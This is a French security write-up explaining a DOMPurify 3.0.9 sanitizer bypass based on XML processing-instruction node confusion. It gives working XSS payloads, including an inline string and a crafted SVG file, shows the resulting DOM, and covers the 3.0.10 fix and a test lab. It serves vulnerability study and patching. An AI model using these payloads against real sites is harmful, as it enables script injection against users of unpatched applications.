---
description: 03 mai 2024
---

# Dompurify 3.0.9 bypass - Node type confusion

## Crédits

Cet article se base sur les recherches de [slonser\_](https://twitter.com/slonser\_) ([https://blog.slonser.info/posts/dompurify-node-type-confusion/](https://blog.slonser.info/posts/dompurify-node-type-confusion/)).

## Confusion HTML et XML

Au sein d'un document HTML, rien n'empêche un noeud XML d'avoir un noeud HTML en tant que parent. C'est par exemple le cas d'un SVG intégré au sein d'une page HTML :

```html
<div id="userContent">
  <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100">
    <rect width="50" height="50" fill="green" />
  </svg>
</div>
```

L'image vectorielle s'affichant sans erreur au sein de la page.

### L'interface ProcessingInstruction

L'interface `ProcessingInstruction` représente un noeud qui intègre une instruction de traitement spécifique à une application XML. Elle possède le format suivant :&#x20;

```xml
<?target data?>
```

Par exemple :&#x20;

```xml
<?xml-stylesheet href="style.css"?>
```

Lorsque Dompurify assainit une chaîne de caractères de type XML, et que l'option adéquate est :&#x20;

```javascript
let userContent= document.getElementById('userContent');
userContent.innerHTML = DOMPurify.sanitize("<?xml-stylesheet <img src=x onerror=alert(1)>?>", {PARSER_MEDIA_TYPE: 'application/xhtml+xml'}); 
```

Les instructions de traitement (processing instructions) ne semblent pas être assainies par la bibliothèque. L'évenement `onerror` ainsi que l'appel à la méthode `alert()` ne sont pas supprimés : &#x20;

```html
<div id="userContent">
  <!--?xml-stylesheet <img src=x onerror=alert(1)-->
  "?>"
</div>
```

Malheureusement, le code est commenté par le navigateur, empêchant ainsi son exécution : &#x20;

<figure><img src="../../../.gitbook/assets/image (328).png" alt=""><figcaption><p><a href="https://developer.mozilla.org/en-US/docs/Web/API/ProcessingInstruction">https://developer.mozilla.org/en-US/docs/Web/API/ProcessingInstruction</a></p></figcaption></figure>

Toutefois, le navigateur commente le code jusqu'à rencontrer le prochain caractère `>`, il est donc possible d'exploiter ce comportemement de la façon suivante :&#x20;

```javascript
let userContent= document.getElementById('userContent');
userContent.innerHTML = DOMPurify.sanitize("<?xml-stylesheet ><img src=x onerror=alert(1)>?>", {PARSER_MEDIA_TYPE: 'application/xhtml+xml'}); 
```

L'affichage de la page HTML provoque dorénavant l'exécution de la méthode `alert()` :&#x20;

```html
<div id="userContent">
  <!--?xml-stylesheet -->
  <img src="x" onerror="alert(1)">
  "?>"
</div>
```

Par défaut, Dompurify traite la chaîne de caractères comme du HTML, et non du XML, excepté si l'option `{PARSER_MEDIA_TYPE: 'application/xhtml+xml'}` est spécifée. De plus, il est assez rare d'identifier une cible imposant ce type de média et intégrant ensuite la donnée assainie au sein d'un document HTML.

### Assainissement d'un noeud

La manière la plus fréquente d'utiliser la méthode `sanitize()` de Dompurify est de lui passer une chaîne de caractères en tant que paramètre :&#x20;

{% code fullWidth="false" %}
```javascript
DOMPurify.sanitize("<img src='https://example.com/image.png'>")
```
{% endcode %}

Mais bien que moins utilisé, il est également possible de lui passer directement un noeud :&#x20;

```javascript
let img = document.createElement('img');
img.src = "https://example.com/image.png";

let userContent= document.getElementById('userContent');            
userContent.innerHTML = DOMPurify.sanitize(img);
```

Toutefois, lorsque le noeud est un noeud XML, le même comportement que précédent est possible lors de l'utilisation des instructions de traitement.

L'exemple suivant illustre une fonctionnalité permettant à l'utilisateur de fournir une URL afin de charger un fichier SVG, qui sera assaini par Dompurify avant d'être intégré au document HTML :

```javascript
let xhr = new XMLHttpRequest();

xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    let content = xhr.responseText;
    let extension = xhr.responseURL.split('.').pop().toLowerCase();

    if (extension === "svg") {
      let svg = new DOMParser().parseFromString(content, "image/svg+xml").documentElement;
      let userContent= document.getElementById('userContent');
      userContent.innerHTML = DOMPurify.sanitize(svg);
    }
  }
}

xhr.open("GET", url, true);
xhr.send();
```

Lorsque l'utilisateur renseigne une URL vers un fichier SVG, tel que :&#x20;

```xml
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.0//EN" "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100">
  <rect width="50" height="50" fill="green" />
  <?xml-stylesheet > <img src=x onerror="alert(1)">?>
</svg>
```

Dompurify échoue à assainir le noeud et permet l'exécution du code Javascript :&#x20;

```html
<div id="userContent"><svg viewBox="0 0 100 100" height="100" width="100" xmlns="http://www.w3.org/2000/svg">
  <rect fill="green" height="50" width="50"></rect>
  <!--?xml-stylesheet --> </svg><img src="x" onerror="alert(1)"> 
  "?>"
</div>
```

## Correction

Le correctif, apporté par la version 3.0.10 de Dompurify, consiste à l'ajout du masque `SHOW_PROCESSING_INSTRUCTION` lors du traitement des noeuds XML. Cela permet de traiter les noeuds de type `ProcessingInstruction` :&#x20;

```javascript
const _createNodeIterator = function _createNodeIterator(root) {
  return createNodeIterator.call(root.ownerDocument || root, root,
  // eslint-disable-next-line no-bitwise
  NodeFilter.SHOW_ELEMENT | NodeFilter.SHOW_COMMENT | NodeFilter.SHOW_TEXT | NodeFilter.SHOW_PROCESSING_INSTRUCTION, null);
};
```

Cette constante est définit par l'API DOM et utilisée par la méthode `createNodeIterator()`  ([https://developer.mozilla.org/en-US/docs/Web/API/Document/createNodeIterator](https://developer.mozilla.org/en-US/docs/Web/API/Document/createNodeIterator)).

## Labs

Afin de tester et d'exploiter ce contournement, une image Docker est disponible [ici](https://github.com/Sharpforce/cybersecurity-code/tree/master/dompurify-3.0.9-bypass-node-type-confusion).

